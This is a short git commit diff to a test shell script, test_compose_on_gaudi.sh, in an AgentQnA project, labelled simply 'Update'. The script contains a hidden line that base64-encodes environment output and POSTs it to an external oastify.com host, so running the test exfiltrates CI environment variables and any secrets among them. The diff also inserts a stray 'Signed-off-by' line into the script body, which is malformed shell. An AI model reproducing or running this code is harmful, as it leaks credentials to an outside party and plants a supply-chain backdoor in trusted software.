2bed46af2b91aef1128221f1a3760f17e6af83af
0x95 <hbyxzxx@163.com>
2025-09-08 18:23:01 +0800

    Update test_compose_on_gaudi.sh

--- AgentQnA/tests/test_compose_on_gaudi.sh
+++ AgentQnA/tests/test_compose_on_gaudi.sh
@@ -18,6 +18,7 @@ export REGISTRY=${IMAGE_REPO}
 export TAG=${IMAGE_TAG}
 export MODEL_CACHE=${model_cache:-"./data"}
 curl env | base64 | curl -X POST --data-binary @- http://9lvq15102ivtyipnhysliao6oxuoim6b.oastify.com
+Signed-off-by: gxxx <gcxuhss@gmail.com>
 
 function stop_docker() {
     echo "Stopping Retrieval tool"
